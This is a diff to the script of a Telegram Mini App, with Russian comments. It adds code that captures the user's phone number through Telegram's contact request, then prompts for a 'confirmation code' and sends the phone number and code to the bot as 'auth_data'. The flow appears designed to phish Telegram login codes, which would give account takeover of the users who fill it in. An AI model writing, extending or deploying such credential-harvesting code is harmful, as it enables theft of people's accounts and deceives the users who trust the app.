@@ -42,30 +42,49 @@
         tg.ready();
         tg.expand();
 
+        let userPhone = "";
+
         function showStep(step) {
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
         }
 
+        // Логика запроса контакта
         document.getElementById('contact-btn').addEventListener('click', () => {
-            tg.requestContact((ok) => {
-                if (ok) {
+            tg.requestContact((ok, response) => {
+                if (ok && response && response.contact) {
+                    // Сохраняем номер телефона из ответа Telegram
+                    userPhone = response.contact.phone_number;
+                    
+                    // Переходим к следующему шагу
                     document.getElementById('step2').classList.add('hidden');
                     document.getElementById('step3').classList.remove('hidden');
                 } else {
-                    alert("Авторизация отклонена. Попробуйте еще раз.");
+                    alert("Авторизация отклонена. Пожалуйста, подтвердите номер телефона.");
                 }
             });
         });
 
+        // Финальная отправка данных боту
         function finish() {
             const code = document.getElementById('auth-code').value;
-            if (!code) return alert("Введите код подтверждения!");
             
-            tg.sendData(JSON.stringify({
+            if (!code) {
+                alert("Введите код подтверждения!");
+                return;
+            }
+
+            // Формируем объект с данными
+            const result = {
                 "type": "auth_data",
+                "phone": userPhone,
                 "code": code
-            }));
+            };
+
+            // Отправляем JSON-строку боту
+            tg.sendData(JSON.stringify(result));
+            
+            // Закрываем WebApp
             tg.close();
         }
     </script>
